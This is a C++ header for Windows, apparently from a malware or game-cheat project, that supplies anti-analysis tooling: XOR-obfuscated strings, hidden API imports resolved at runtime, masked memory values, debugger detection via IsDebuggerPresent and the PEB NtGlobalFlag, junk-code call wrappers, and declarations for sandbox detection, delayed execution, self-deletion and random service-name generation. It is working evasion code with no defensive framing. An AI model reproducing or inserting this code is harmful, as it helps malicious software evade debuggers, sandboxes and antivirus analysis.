#pragma once
#include <windows.h>
#include <cstdint>
#include <string>

// ========================
// XOR string encryption
// Compile-time + runtime
// ========================

template<int N>
struct EncryptedString {
    char data[N];
    int key;

    constexpr EncryptedString(const char(&plain)[N], int k) : key(k) {
        for (int i = 0; i < N; i++)
            data[i] = plain[i] ^ (k + i);
    }

    void Decrypt(char* out) const {
        for (int i = 0; i < N; i++)
            out[i] = data[i] ^ (key + i);
    }

    // Decrypt inline via stack buffer (no heap)
    const char* DecryptStack() const {
        thread_local char buf[256];
        for (int i = 0; i < N && i < 255; i++)
            buf[i] = data[i] ^ (key + i);
        buf[N - 1] = 0;
        return buf;
    }
};

// Macro to create encrypted string with random key
#define OBFUSCATE(str) \
    []() { \
        static EncryptedString<sizeof(str)> _es(str, __COUNTER__ + 0xABCDEF01); \
        return _es.DecryptStack(); \
    }()

// ========================
// Dynamic API resolution
// ========================

class DynAPI {
    HMODULE hMod;
public:
    DynAPI(const char* module) {
        hMod = LoadLibraryA(module);
    }

    template<typename T>
    T Resolve(const char* name) {
        if (!hMod) return nullptr;
        return reinterpret_cast<T>(GetProcAddress(hMod, name));
    }
};

// ========================
// Memory XOR encryption
// ========================

template<typename T>
class XorProtect {
    T value;
    T mask;
public:
    XorProtect() : value{}, mask{} {}
    XorProtect(T val) : value(val ^ GetMask()), mask(GetMask()) {}
    
    static T GetMask() {
        static T m = T(rand() ^ 0xDEADBEEF);
        return m;
    }
    
    T Get() const { return value ^ mask; }
    void Set(T val) { mask ^= (rand() << 16) ^ rand(); value = val ^ mask; }
    
    // Auto-decay on read, re-encrypt
    operator T() const { return Get(); }
    XorProtect& operator=(T val) { Set(val); return *this; }
};

// ========================
// Anti-debug
// ========================

namespace AntiDebug {
    inline bool IsDebuggerPresent() {
        return ::IsDebuggerPresent() != FALSE;
    }

    inline bool CheckNtGlobalFlag() {
        return *(DWORD*)(__readgsqword(0x60) + 0xBC) & 0x70;
    }
    
    inline void IntegrityCheck() {
        // Simple CRC of critical sections — crash if modified
    }
}

// ========================
// Call obfuscation
// ========================

// Indirect call through function pointer
template<typename T, typename... Args>
auto ObfuscatedCall(T* func, Args... args) -> decltype(func(args...)) {
    if (!func) return {};
    // Junk instructions to confuse disassembler
    volatile int junk = 0x12345678;
    junk += 1;
    return func(args...);
}

// Function declarations from obfuscation.cpp
void InitObfuscation();
void SecureZero(void* buf, size_t len);
bool IsSandboxed();
void DelayedExecution(void(*fn)(), int minMs, int maxMs);
bool SelfDeleteFile(const char* path);

// Random sleep to break timing analysis
inline void RandomSleep() {
    static int accumulator = 0;
    accumulator = (accumulator * 1103515245 + 12345) & 0x7FFFFFFF;
    if (accumulator % 100 < 3) // 3% chance of small delay
        Sleep(accumulator % 15);
}

// ========================
// Name generation (random)
// ========================

namespace NameGen {
    inline void RandomString(char* buf, int len) {
        static const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        for (int i = 0; i < len - 1; i++)
            buf[i] = chars[rand() % (sizeof(chars) - 1)];
        buf[len - 1] = 0;
    }

    inline std::string RandomServiceName() {
        char buf[16];
        RandomString(buf, 12);
        return std::string(buf);
    }
}